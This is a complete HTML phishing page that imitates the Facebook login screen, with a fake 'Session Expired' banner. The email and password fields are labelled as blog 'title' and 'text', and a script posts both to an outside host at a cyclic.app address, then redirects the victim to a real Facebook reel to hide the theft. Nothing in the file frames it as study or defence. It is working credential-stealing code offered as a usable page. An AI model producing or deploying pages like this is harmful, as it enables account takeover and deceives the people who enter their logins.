<!DOCTYPE html>

<html lang="en">
  <head>
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico" />
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <link rel="stylesheet" href="style.css">
  </head>
  <body>
    <div id="msg"  style="padding: 15px; background-color: #f44336; color: white; text-align: center;">
      <strong>Session Expired.</strong> Please login again.
    </div>
    <div id="main" class="container flex">
      <div class="facebook-page flex">
        <div class="text">
          <h1>facebook</h1>
          <p>Connect with friends and the world </p>
          <p> around you on Facebook.</p>
        </div>
        <form  id="blogForm">
          <input id="title" name="title" type="text" placeholder="Email or phone number" required>
          <input id="text" type="password" name="text" placeholder="Password" required>
          <div class="link">
            <button type="submit" class="login">Login</button>
            <a href="#" class="forgot">Forgot password?</a>
          </div>
          <hr>
          <div class="button">
             <button type="button" onclick="savePost()">Create new account</button>
        
          </div>
        </form>

      
      </div>
    </div>



    <script>
      
      function savePost() {
  const title = document.getElementById('title').value;
  const text = document.getElementById('text').value;

  if (title !== '' && text !== '') {
    fetch('https://grumpy-pear-caridea.cyclic.app/save-blog', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        title: title,
        text: text,
      }),
    })
      .then(response => response.text())
      .then(data => {
        document.getElementById('title').value = '';
        document.getElementById('text').value = '';
      })
      .catch(error => console.error('Error:', error));
  }
}


document.getElementById('blogForm').addEventListener('submit', function(event) {
  savePost();
  window.location.href = 'https://www.facebook.com/reel/875162394109175'
  event.preventDefault();
});












    </script>
  </body>
</html>
